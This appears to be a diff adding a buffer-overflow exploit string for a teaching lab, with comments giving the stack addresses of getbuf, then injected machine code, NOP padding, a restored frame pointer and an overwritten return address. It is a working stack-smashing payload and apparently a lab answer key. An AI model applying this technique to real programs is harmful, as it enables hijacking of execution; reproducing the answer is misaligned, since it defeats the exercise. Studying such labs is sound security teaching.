@@ -1,0 +1,16 @@
+/* getbuf return address at address: 0x55683494  */
+/* getbuf saved frame pointer:       0x556834c0  */
+/* Local buffer starts at address:   0x55683468  */
+/* Padding required:                 40 bytes */
+
+b8 08 c3 13 3b  /* mov    $0x3b13c308,%eax */
+68 81 8e 04 08  /* push   $0x8048e81 */
+c3  /* ret     */
+
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
+
+/* saved frame pointer */
+
+c0 34 68 55
+/* return address (back in test()) */
+68 34 68 55
